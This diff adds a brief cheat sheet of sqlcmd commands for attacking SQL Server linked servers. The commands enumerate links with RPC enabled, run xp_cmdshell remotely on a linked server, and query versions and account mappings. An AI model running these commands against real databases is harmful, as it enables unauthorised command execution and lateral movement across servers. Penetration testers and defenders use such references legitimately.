@@ -1,0 +1,17 @@
+# Find Database Links where RPC is Enabled using sqlcmd
+sqlcmd -E -Q "SELECT name, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;"
+
+# Execute xp_cmdshell on linked server using sqlcmd
+sqlcmd -E -Q "EXEC ('EXEC xp_cmdshell ''whoami''') AT <LinkedServerName>"
+
+# Find out version of linked server using sqlcmd using openquery
+sqlcmd -E -Q "SELECT * FROM OPENQUERY(<LinkedServerName>, 'SELECT @@version')"
+
+# Find Database Links using sqlcmd
+sqlcmd -E -W -s"|" -Q "SELECT * FROM master..sysservers"
+
+# Execute Query using current account using sqlcmd
+sqlcmd -E -Q "<Query>"
+
+# See current Account Mapping using sqlcmd 
+sqlcmd -E -Q "SELECT SYSTEM_USER, USER_NAME();"
